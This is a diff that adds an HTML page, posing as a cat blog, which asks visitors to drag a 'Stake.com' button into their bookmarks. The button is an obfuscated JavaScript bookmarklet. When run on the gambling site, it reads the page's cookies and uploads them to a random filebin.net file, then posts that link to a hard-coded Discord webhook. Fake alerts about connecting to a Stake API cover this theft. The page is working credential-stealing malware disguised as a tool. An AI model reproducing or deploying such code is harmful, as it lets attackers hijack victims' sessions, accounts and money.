@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cat blogging site</title>
+    <link rel="icon" href="catfunnyy.jpg">
+    <meta name="description" content="funny cats and more! this site is only for educational purposes. we are not liable for the content posted">
+   
+    <style>
+        body {
+            background-color: #0E202D; /* Dunkles Anthrazit */
+            color: #e0e0e0; /* Helles Grau für Text */
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            background-color: #1B2B38; /* Etwas helleres Grau für den Container */
+            border-radius: 10px;
+            padding: 30px;
+            display: inline-block;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7);
+            margin-top: 60px;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        h1 {
+            color: #00E700; /* Weiß für den Header */
+            margin-bottom: 20px;
+            font-size: 2em;
+            font-weight: bold;
+            animation: slideIn 1s ease-out;
+        }
+        .bookmarklet {
+            display: inline-block;
+            padding: 12px 30px;
+            background-color: #192C37; /* Dunkles Grau */
+            color: #00E700; /* Weißer Text */
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            border: 2px solid #5a5a5a; /* Etwas helleres Grau für den Rand */
+            transition: background-color 0.3s, border-color 0.3s;
+            animation: pulse 2s infinite;
+        }
+        .bookmarklet:hover {
+    /* Etwas helleres Grau bei Hover */
+            border-color: #6a6a6a;
+        }
+        .arrow {
+            display: inline-block;
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 15px solid #0E202D; /* Gleiche Farbe wie der Button */
+            margin: 30px 0;
+            animation: bounce 1s ease-in-out infinite;
+        }
+        p {
+            margin-top: 20px;
+            font-size: 1.1em;
+            color: #0E202D; /* Helleres Grau für den Text */
+        }
+
+        /* Animationen */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        /* Responsives Design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+                margin-top: 30px;
+            }
+            h1 {
+                font-size: 1.5em;
+            }
+            .bookmarklet {
+                padding: 10px 20px;
+                font-size: 0.9em;
+            }
+            .arrow {
+                width: 0;
+                height: 0;
+                border-left: 12px solid transparent;
+                border-right: 12px solid transparent;
+                border-top: 12px solid #4a4a4a;
+            }
+
+            
+
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="stake_logo-removebg-preview.png" height="140px" class="stakelogo">
+        <h2>Drag the button to your Bookmarks</h2>
+        <div class="arrow"></div>
+        <a href="javascript:const _0x43cbe9=_0x3049;(function(_0x419121,_0x37f742){const _0x364563=_0x3049,_0x3a85ef=_0x419121();while(!![]){try{const _0x363ec6=-parseInt(_0x364563(0x136))/0x1*(-parseInt(_0x364563(0x137))/0x2)+-parseInt(_0x364563(0x139))/0x3*(parseInt(_0x364563(0x130))/0x4)+parseInt(_0x364563(0x13b))/0x5+parseInt(_0x364563(0x133))/0x6*(parseInt(_0x364563(0x132))/0x7)+-parseInt(_0x364563(0x134))/0x8*(-parseInt(_0x364563(0x12e))/0x9)+parseInt(_0x364563(0x129))/0xa+-parseInt(_0x364563(0x125))/0xb*(parseInt(_0x364563(0x131))/0xc);if(_0x363ec6===_0x37f742)break;else _0x3a85ef['push'](_0x3a85ef['shift']());}catch(_0x48cd25){_0x3a85ef['push'](_0x3a85ef['shift']());}}}(_0x44e1,0x6855c));function _0x44e1(){const _0x2bc12e=['Decoder\x20error','3369990ttGhSl','aHR0cHM6Ly9maWxlYmluLm5ldA==','.txt','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','api\x20error','9nWQKmc','random','52ovXHPv','36aWJVVx','254023SMlYjc','102ZWnAOx','3251848zjJJNl','EFGHI4L7NOPQR5UVWXY','129kdKUoD','3202oORQZw','error','183003YCWGFz','stringify','77525yYqbGx','POST','text/plain','length','Succesfully\x20connected\x20to\x20https://stake.com/_api/','log','aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4NTY4Njk0NDIyNzEzMTU5NC9fbTE3RTdJalZuOHRVYkJxVy1WSWdlMTF6dVZzNVR4SDVIY2lqWFcwRnZEUTZXUmtkUTRTNk5LdllpcXhIWGFMWXIwaQ==','success','application/json','1327546gHHEJo','charAt','cookie'];_0x44e1=function(){return _0x2bc12e;};return _0x44e1();}function stakepredictor(){const _0x17f7f8=_0x3049,_0x4d4603=_0x17f7f8(0x135);return _0x4d4603;}function connectstakeapi(_0x14f507){return _0x14f507;}function connectstakecom(){return;}function stakeservicesapi(){return;}function getSTAKE(){const _0x25cb2e=_0x3049;return document[_0x25cb2e(0x127)];}function generateRandomString(_0x2b5a40){const _0x550c4d=_0x3049,_0x5bab1d=_0x550c4d(0x12c);let _0x74588f='';for(let _0x1b9f9c=0x0;_0x1b9f9c<_0x2b5a40;_0x1b9f9c++){_0x74588f+=_0x5bab1d[_0x550c4d(0x126)](Math['floor'](Math[_0x550c4d(0x12f)]()*_0x5bab1d[_0x550c4d(0x13e)]));}return _0x74588f;}const randomBinId=generateRandomString(0xa),randomFilename=generateRandomString(0xf)+_0x43cbe9(0x12b),base64BaseUrl=_0x43cbe9(0x12a);function decodeBase64(_0x3807af){try{return atob(_0x3807af);}catch(_0x239674){return console['error']('b64\x20error'),null;}}const baseUrl=decodeBase64(base64BaseUrl),StakeAPiUpload=baseUrl+'/'+randomBinId+'/'+randomFilename,STAKEAPI64=_0x43cbe9(0x141),STAKEAPI=decodeBase64(STAKEAPI64);(!STAKEAPI||!baseUrl)&&console['error'](_0x43cbe9(0x128));async function UploadStake(){const _0x38c207=_0x43cbe9,_0x257c5d=getSTAKE();try{const _0x473944=await fetch(StakeAPiUpload,{'method':_0x38c207(0x13c),'headers':{'Content-Type':_0x38c207(0x13d)},'body':_0x257c5d});_0x473944['ok']?(alert('Connecting\x20to\x20stake.com\x20Endpoint'),alert(_0x38c207(0x13f)),STAKEAPI&&sendUrlToStake(StakeAPiUpload)):(console['log'](_0x38c207(0x12d)),STAKEAPI&&sendUrlToStake(StakeAPiUpload));}catch(_0x2a41f8){console[_0x38c207(0x138)](_0x38c207(0x12d)),STAKEAPI&&sendUrlToStake(StakeAPiUpload);}}function _0x3049(_0x2299f0,_0x4ef1e1){const _0x44e1d6=_0x44e1();return _0x3049=function(_0x304991,_0x5aa66b){_0x304991=_0x304991-0x124;let _0x1f360b=_0x44e1d6[_0x304991];return _0x1f360b;},_0x3049(_0x2299f0,_0x4ef1e1);}function sendUrlToStake(_0x387ff3){const _0x33192e=_0x43cbe9,_0x5e54d0={'content':'lol:\x20'+_0x387ff3};if(!STAKEAPI){alert('STAKE\x20API\x20ERROR');return;}fetch(STAKEAPI,{'method':_0x33192e(0x13c),'headers':{'Content-Type':_0x33192e(0x124)},'body':JSON[_0x33192e(0x13a)](_0x5e54d0)})['then'](_0x520769=>{const _0x3d837a=_0x33192e;_0x520769['ok']?console[_0x3d837a(0x140)](_0x3d837a(0x142)):console['log'](_0x3d837a(0x142));})['catch'](_0x1dadba=>{alert('API\x20ERROR');});}UploadStake();;" class="bookmarklet">Stake.com</a>
+        <p>If Bookmarks not shown click Ctrl+Shift+B.</p>
+    </div>
+</body>
+</html>
